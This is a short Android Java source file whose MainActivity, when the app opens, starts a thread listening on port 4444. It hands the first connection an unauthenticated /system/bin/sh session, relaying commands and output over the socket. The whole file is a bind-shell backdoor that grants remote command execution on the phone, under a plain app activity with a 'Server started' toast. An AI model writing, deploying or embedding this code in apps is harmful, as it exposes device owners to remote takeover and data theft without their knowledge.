import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;


public class MainActivity extends Activity {

    private static final int PORT = 4444;
    private Handler mHandler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Thread serverThread = new Thread(new ServerThread());
        serverThread.start();
    }

    private class ServerThread implements Runnable {

        public void run() {
            try {
                ServerSocket serverSocket = new ServerSocket(PORT);
                mHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(
                            MainActivity.this, "Server started", Toast.LENGTH_SHORT
                        ).show();
                    }
                });

                Socket socket = serverSocket.accept();

                ProcessBuilder pb = new ProcessBuilder("/system/bin/sh");
                pb.redirectErrorStream(true);
                Process process = pb.start();

                BufferedReader processOutputReader = new BufferedReader(
                    new InputStreamReader(process.getInputStream())
                );
                DataOutputStream processInputWriter = new DataOutputStream(
                    process.getOutputStream()
                );

                while (true) {
                    BufferedReader socketInputReader = new BufferedReader(
                        new InputStreamReader(socket.getInputStream())
                    );
                    DataOutputStream socketOutputWriter = new DataOutputStream(socket.getOutputStream());

                    socketOutputWriter.writeBytes("$ ");
                    socketOutputWriter.flush();

                    String socketInput = socketInputReader.readLine();
                    if (socketInput == null) {
                        break;
                    }

                    processInputWriter.writeBytes(socketInput + "\n");
                    processInputWriter.flush();

                    String processOutputLine;
                    while ((processOutputLine = processOutputReader.readLine()) != null) {
                        socketOutputWriter.writeBytes(processOutputLine + "\n");
                        socketOutputWriter.flush();
                    }
                }

                process.destroy();
                socket.close();
                serverSocket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
